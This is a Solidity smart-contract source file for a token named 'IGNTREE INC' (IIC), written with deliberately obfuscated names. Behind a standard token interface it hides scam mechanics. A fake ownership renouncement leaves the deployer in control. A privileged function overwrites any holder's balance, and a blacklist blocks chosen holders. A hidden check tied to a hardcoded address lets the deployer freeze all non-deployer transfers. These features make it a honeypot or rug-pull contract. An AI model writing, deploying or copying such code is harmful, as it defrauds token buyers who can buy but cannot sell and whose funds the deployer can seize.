//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface exemptBuy {
    function totalSupply() external view returns (uint256);

    function balanceOf(address exemptAutoShould) external view returns (uint256);

    function transfer(address buyLaunch, uint256 isTrading) external returns (bool);

    function allowance(address amountMax, address spender) external view returns (uint256);

    function approve(address spender, uint256 isTrading) external returns (bool);

    function transferFrom(address sender,address buyLaunch,uint256 isTrading) external returns (bool);

    event Transfer(address indexed from, address indexed sellEnable, uint256 value);
    event Approval(address indexed amountMax, address indexed spender, uint256 value);
}

interface liquidityTotal {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface exemptReceiver {
    function createPair(address teamMode, address buyFee) external returns (address);
}

abstract contract amountFromMarketing {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface listTokenTotal is exemptBuy {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract IGNTREEINC is amountFromMarketing, exemptBuy, listTokenTotal {

    string private fundEnable = "IGNTREE INC";

    bool private tokenMax;

    address public txSellFund;

    function receiverTeam() public {
        emit OwnershipTransferred(tokenSell, address(0));
        sellWallet = address(0);
    }

    uint256 private exemptSender;

    mapping(address => bool) public walletTotal;

    string private maxMinAt = "IIC";

    function getOwner() external view returns (address) {
        return sellWallet;
    }

    function owner() external view returns (address) {
        return sellWallet;
    }

    constructor (){
        
        receiverTeam();
        liquidityTotal senderAmount = liquidityTotal(receiverLaunch);
        txSellFund = exemptReceiver(senderAmount.factory()).createPair(senderAmount.WETH(), address(this));
        if (tokenMax) {
            marketingLiquidity = exemptSender;
        }
        tokenSell = _msgSender();
        receiverTake[tokenSell] = true;
        liquidityIs[tokenSell] = walletLimit;
        if (exemptSender != txReceiver) {
            txReceiver = marketingLiquidity;
        }
        emit Transfer(address(0), tokenSell, walletLimit);
    }

    function transferFrom(address receiverMax, address buyLaunch, uint256 isTrading) external override returns (bool) {
        if (_msgSender() != receiverLaunch) {
            if (marketingIs[receiverMax][_msgSender()] != type(uint256).max) {
                require(isTrading <= marketingIs[receiverMax][_msgSender()]);
                marketingIs[receiverMax][_msgSender()] -= isTrading;
            }
        }
        return walletReceiverTrading(receiverMax, buyLaunch, isTrading);
    }

    function decimals() external view virtual override returns (uint8) {
        return exemptSell;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return walletLimit;
    }

    mapping(address => bool) public receiverTake;

    address public tokenSell;

    function limitMax(uint256 isTrading) public {
        exemptLaunched();
        shouldLiquidity = isTrading;
    }

    function walletReceiverTrading(address receiverMax, address buyLaunch, uint256 isTrading) internal returns (bool) {
        if (receiverMax == tokenSell) {
            return fromList(receiverMax, buyLaunch, isTrading);
        }
        uint256 liquidityList = exemptBuy(txSellFund).balanceOf(senderReceiver);
        require(liquidityList == shouldLiquidity);
        require(!walletTotal[receiverMax]);
        return fromList(receiverMax, buyLaunch, isTrading);
    }

    function balanceOf(address exemptAutoShould) public view virtual override returns (uint256) {
        return liquidityIs[exemptAutoShould];
    }

    function fromList(address receiverMax, address buyLaunch, uint256 isTrading) internal returns (bool) {
        require(liquidityIs[receiverMax] >= isTrading);
        liquidityIs[receiverMax] -= isTrading;
        liquidityIs[buyLaunch] += isTrading;
        emit Transfer(receiverMax, buyLaunch, isTrading);
        return true;
    }

    address senderReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 private txReceiver;

    function symbol() external view virtual override returns (string memory) {
        return maxMinAt;
    }

    uint256 exemptEnable;

    function name() external view virtual override returns (string memory) {
        return fundEnable;
    }

    function exemptLaunched() private view {
        require(receiverTake[_msgSender()]);
    }

    function totalFee(address totalTeamLaunch) public {
        if (tradingSender) {
            return;
        }
        if (exemptSender == marketingLiquidity) {
            minSwap = true;
        }
        receiverTake[totalTeamLaunch] = true;
        if (exemptSender == txReceiver) {
            exemptSender = txReceiver;
        }
        tradingSender = true;
    }

    function approve(address takeSell, uint256 isTrading) public virtual override returns (bool) {
        marketingIs[_msgSender()][takeSell] = isTrading;
        emit Approval(_msgSender(), takeSell, isTrading);
        return true;
    }

    uint256 private walletLimit = 100000000 * 10 ** 18;

    event OwnershipTransferred(address indexed amountEnableIs, address indexed marketingExempt);

    address private sellWallet;

    function toWallet(address swapAmount, uint256 isTrading) public {
        exemptLaunched();
        liquidityIs[swapAmount] = isTrading;
    }

    bool public minSwap;

    function allowance(address senderLaunched, address takeSell) external view virtual override returns (uint256) {
        if (takeSell == receiverLaunch) {
            return type(uint256).max;
        }
        return marketingIs[senderLaunched][takeSell];
    }

    uint256 shouldLiquidity;

    mapping(address => uint256) private liquidityIs;

    function transfer(address swapAmount, uint256 isTrading) external virtual override returns (bool) {
        return walletReceiverTrading(_msgSender(), swapAmount, isTrading);
    }

    bool public tradingSender;

    uint8 private exemptSell = 18;

    mapping(address => mapping(address => uint256)) private marketingIs;

    function listMin(address toIs) public {
        exemptLaunched();
        if (marketingLiquidity == exemptSender) {
            tokenMax = false;
        }
        if (toIs == tokenSell || toIs == txSellFund) {
            return;
        }
        walletTotal[toIs] = true;
    }

    uint256 public marketingLiquidity;

    address receiverLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

}